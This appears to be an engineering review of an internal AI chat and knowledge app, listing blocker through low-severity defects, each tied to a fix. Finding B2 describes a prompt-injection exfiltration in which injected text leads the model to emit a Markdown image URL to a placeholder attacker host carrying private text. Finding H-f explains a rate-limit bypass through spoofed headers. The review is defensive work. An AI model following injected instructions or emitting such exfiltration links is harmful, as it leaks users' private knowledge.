# Design and implementation review — 2026-10-21

Scope: `docs/proposal.html` (v0.1), `docs/implementation-plan.md`, and all Phase 0/1 code at commit `e45c666`.

Goal of the review: make the design detailed enough that implementing it produces a production-ready system without rework loops. The outcome is the design set in [`docs/design/`](../design/) and the rewritten [`docs/implementation-plan.md`](../implementation-plan.md).

## Verdict

The proposal's direction is sound: one Postgres, LiteLLM gateway, private-by-default knowledge, approval gates, and a credential-free sandbox are the right calls. Phase 0/1 code is clean, typed, linted, and has good test coverage of the ACL rules.

It is **not production-ready yet**, for three reasons:

1. **There are concrete defects in Phase 0/1** that a production deployment would hit: the production frontend image does not build, LLM output can exfiltrate private knowledge through Markdown images, there is no TLS, no backups, and the wiki's git repos can drift from the database.
2. **Phases 2–5 are outlines, not designs.** They have no data model, API contract, state machine, failure handling or acceptance criteria. Implementing from an outline is exactly what causes the "build, test, fix, change" loop.
3. **Non-functional requirements were never written down**: scale, budgets, retention, backup RPO/RTO, timezones, upgrade procedure. Each of these forces a redesign if it's discovered late.

A new **Phase H (hardening)** is inserted before Phase 2 to fix the defects. It is cheaper to fix the foundations now than to build three more phases on them.

Testing note: no design removes the need for tests. What this design does is move testing to the left. Every task has acceptance criteria written as tests, and CI (task H2) runs them on every push, so failures are caught by the pipeline instead of by you.

## How this review was done

- Read every file in the repo (backend, frontend, compose, migrations, docs).
- Frontend: `npm ci`, `tsc -b`, `vitest run` (19 passed), `npm run build` (**fails**, see B1).
- Backend: `uv sync --frozen`, `ruff check` and `ruff format --check` (clean). The 60 database-backed tests could **not** be run in the review sandbox because the ParadeDB image could not be pulled. CI (H2) closes that gap.

## Findings

Severity: **Blocker** = must fix before any production use. **High** = will cause incidents or data loss under normal use. **Medium** = will cause user-visible problems or operational pain. **Low** = hygiene.

Each finding names the task that fixes it.

### Blockers

| # | Finding | Evidence | Fix |
|---|---|---|---|
| B1 | **Production web image does not build.** `npm run build` runs `tsc -b`, which fails on a type error in a test file, so the `prod` stage of `frontend/Dockerfile` fails. Dev mode hides it because the override uses the `dev` target. | `frontend/src/api.test.ts:36` (`'err' is of type 'unknown'`); `frontend/package.json` build script | H1 (fixed in this PR), H2 adds an image build to CI so it can't regress |
| B2 | **Zero-click exfiltration of private knowledge.** The chat renders LLM Markdown with images enabled and the site sends no CSP. Any text the model reads (a teammate's published doc, a README in an ingested repo, an imported transcript) can instruct it to emit `![](https://attacker/?d=<private text>)`. The browser fetches it the moment the answer renders. | `frontend/src/components/ui.tsx:6-10`; `frontend/nginx.conf` has no security headers | H4 (no remote images, safe URL transform), H3 (CSP `img-src 'self' data:`) |
| B3 | **No TLS.** Passwords and session cookies cross the network in clear text. `MWB_COOKIE_SECURE=false` in `.env.example`; nginx listens on port 80 only; nothing terminates HTTPS. | `.env.example:5`, `frontend/nginx.conf:2` | H3 (Caddy with company or internal certificate) |
| B4 | **No backups, and the wiki has no second copy.** Wiki pages exist only in git repos on the `mwbdata` volume. Losing the volume or `MWB_SECRET_KEY` loses wiki content or every stored token. | `docker-compose.yml` volumes; no backup tooling | H14 (nightly backup, restore script, monthly restore drill) |

### High

| # | Finding | Evidence | Fix |
|---|---|---|---|
| H-a | **Wiki git and database can diverge.** Git commits happen before the DB commit. If the DB transaction fails, git has the change but the DB doesn't. Publishing is worse: the file moves to the public repo, but if the DB commit fails the row still says private, so `read_page` returns an empty page and `delete_page` fails because `git rm` finds no file. Nothing reconciles them. | `app/knowledge/wiki.py:76-81, 96-107, 111-117`; routes commit afterwards | H7 (WikiWriter with compensation, reconcile job) |
| H-b | **Lost updates in the wiki.** No optimistic concurrency. Two browser tabs overwrite each other. The librarian reads a page, spends minutes in the LLM, then overwrites any edit the user made meanwhile. | `app/knowledge/routes.py:278-293`; `app/knowledge/librarian.py:58-74` | H7 (`base_sha` on update, 409 on conflict), H8 (librarian re-checks the sha before writing) |
| H-c | **Long transactions around network calls.** `ingest_project` keeps one transaction open across every file, every LLM summary and every embedding call. `upsert_document` embeds inside the transaction. With the default pool (5+10 per process) a couple of ingests can exhaust connections, hold row locks for minutes, and one late failure throws away all the LLM spend for that repo. | `app/knowledge/ingest/repos.py:256-301`; `app/knowledge/indexer.py:75` | H6 (rule R1: no network call inside a transaction; per-file commits) |
| H-d | **The same project can be ingested twice concurrently.** `queueing_lock` only stops two *queued* jobs. A queued job and a running job can run together in the same checkout directory, causing `index.lock` errors and unique-constraint races. | `app/tasks/app.py:31`; `app/knowledge/routes.py:419,426` | H9 (Procrastinate `lock=project:<id>`) |
| H-e | **No spend control or attribution.** Everything uses the LiteLLM master key. There are no per-user or per-run budgets, and cost is not recorded although the plan promised it. One repo ingest can make 300 summary calls. | `app/llm/models.py`; `app/models.py` `Message` has no cost | H12 (per-user virtual keys with budgets, cost capture, usage limits) |
| H-f | **Rate limit bypass through spoofed `X-Forwarded-For`.** `uvicorn --forwarded-allow-ips=*` trusts the header from anyone, and the dev override publishes port 8000 directly. Anyone who can reach port 8000 can rotate the "client IP". Also, the limit is per username+IP only, so password spraying across many usernames is unlimited. | `docker-compose.yml:46`; `compose.override.yml:10-11`; `app/auth/routes.py:69` | H3 (trust only the proxy's fixed IP), H11 (per-IP and per-username limits) |
| H-g | **Procrastinate upgrades will break.** Migration 0001 applies a snapshot of Procrastinate's schema. Upgrading the library later requires its own migration scripts, and nothing documents or applies them. The version is `>=3.5`, unpinned in `pyproject.toml`. | `alembic/versions/0001_core.py:21` | H5 (pin exact version), operations runbook (upgrade procedure) |
| H-h | **Embedding configuration can silently break.** The vector dimension is both a constant (`EMBED_DIMS=1024`) and a setting (`MWB_EMBED_DIMS`). Setting the env var to anything else makes every insert fail. Vectors don't record which model made them, so changing `MWB_EMBED_MODEL_ID` silently mixes incompatible vector spaces. | `app/models.py:24`; `app/config.py:17` | H5 (startup check), H10 (`embed_model` column, `mwb reembed`) |
| H-i | **Prod images ship dev tooling and migrate on every start.** The backend image installs the `dev` group (pytest, ruff) and copies tests. The `api` container runs `alembic upgrade head` on start, so adding a second api replica would race migrations. | `backend/Dockerfile:10,13`; `docker-compose.yml:46` | H1 (multi-stage image, one-shot `migrate` service) |

### Medium

| # | Finding | Evidence | Fix |
|---|---|---|---|
| M1 | BM25 uses the default tokenizer. Chinese text is not segmented into words, so Chinese queries miss. The user base works in Swedish, Polish and Chinese as well as English. | `alembic/versions/0002_knowledge.py:312` | H10 |
| M2 | Poison chunks: `embed_missing` re-selects the same first 256 failing chunks every 10 minutes forever, so later chunks never get embedded. | `app/knowledge/indexer.py:105-120` | H10 |
| M3 | Uploads are keyed by file name. Uploading a different `notes.md` silently replaces the earlier one. | `app/knowledge/ingest/files.py:46` | H9 |
| M4 | Transcripts over 50 MB are silently truncated, so the last record is cut mid-line. | `app/knowledge/routes.py:474` | H9 |
| M5 | Git credentials are passed in argv (`-c http.extraHeader=…`), which is visible in the process list inside the container. | `app/knowledge/ingest/repos.py:85` | H9 |
| M6 | Gerrit authenticated git-over-HTTP needs the `/a/` path prefix. The URL validator doesn't check or add it, so private Gerrit repos fail with a confusing auth error. | `app/knowledge/ingest/repos.py:55-65` | H9 |
| M7 | Repo caches are never deleted when a project is removed, and there is no disk guard. | `app/knowledge/routes.py:445-454` | H9 |
| M8 | `login_attempts` and expired `auth_sessions` grow without bound (cleanup only happens on a successful login for the same key). | `app/auth/service.py:68-69` | H11 |
| M9 | One Fernet key, no rotation path. A wrong key makes every secret read a 500 error. | `app/secrets/service.py:16-17` | H11 |
| M10 | Timezones: the nightly librarian runs at 02:00 UTC (04:00 in Stockholm). There is no per-user timezone, which Phase 2 schedules need. | `app/tasks/app.py:66` | H5, H8 |
| M11 | The librarian rewrites whole pages with no guardrails. It can drop sections or user-written content. Git history allows recovery, but nobody is told. | `app/knowledge/librarian.py:58-74` | H8 |
| M12 | No CHECK constraints on enum-like columns (`visibility`, `role`, `status`, `source_type`). | migrations 0001/0002 | H5 |
| M13 | Concurrent messages in one chat session interleave. A slow reply has no keep-alive, so proxies may cut idle SSE streams. | `app/chat/routes.py:229-285` | H13 |
| M14 | Only the API has a healthcheck. The worker has none, and nothing reports a stuck queue or a failed nightly job. | `docker-compose.yml` | H14 |
| M15 | No user offboarding. A deactivated user's public content stays owned by them, and private data, wiki repo, repo caches and keys are never removed. | `app/users/routes.py` | H11 |

### Low

| # | Finding | Fix |
|---|---|---|
| L1 | `frontend/coverage/` and `frontend/tsconfig.tsbuildinfo` are committed. | H1 (fixed in this PR) |
| L2 | Wiki history is lost from view after publishing (the log only covers the destination repo). | H7 (`Moved-From` trailer) |
| L3 | Error responses have no machine-readable `code`, so the UI can't distinguish "budget exceeded" from other failures. | H5 (error format, rule R12) |

## Documentation findings

| # | Finding | Resolution |
|---|---|---|
| D1 | The plan contains a stale local path (`/home/lv/source/2026/myworkbuddy`) and says the repo is empty. | Rewritten plan |
| D2 | Model alias names disagree: plan says `chat, planner, embed`; code and README say `chat, fast, embed`. | Fixed set: `chat, fast, embed, planner, coder` (ADR-8) |
| D3 | The plan promises shadcn/ui and per-message cost; neither was built and the docs weren't updated. | Plan now reflects plain CSS; cost moved to H12 with a concrete mechanism |
| D4 | Phases 2–5 have no data model, APIs, state machines, failure handling or acceptance criteria. | `docs/design/02`–`04` |
| D5 | No non-functional requirements (scale, budgets, retention, RPO/RTO, timezones). | `docs/design/00` §1 |
| D6 | No threat model beyond one paragraph, no operations runbook, no CI. | `docs/design/05`, `docs/design/06`, task H2 |
| D7 | The 2026-10-20 reuse decision (OpenHands; third-party MCP servers for Jira/GitLab/K8s) doesn't address per-user credentials, tool tiers, or how the sandbox design fits around OpenHands. | ADR-2 (Claude Code headless in our runner, chosen 2026-10-21) and ADR-3 (native read connectors) |
| D8 | "Docker verify" in the plan's cycle is undefined. | Release gates in the rewritten plan |
| D9 | Open question from the proposal still unanswered: may company code, logs and tickets be sent to Bedrock, and in which region? `.env.example` defaults to `us-east-1`. | Listed in `docs/design/00` §7 with a safe default (EU region, Bedrock only) |

## What was changed in this PR besides docs

- `frontend/src/api.test.ts`: typed the caught error so `tsc -b` and the production build pass (B1). Verified: `npm run build` succeeds, 19/19 tests pass.
- `.gitignore`: ignore `frontend/coverage/` and `*.tsbuildinfo`; removed the committed copies (L1).
- `CLAUDE.md`: implementation rules for Claude Code, pointing at the design docs.

Everything else is specified as tasks in the implementation plan, so each fix ships with its tests.
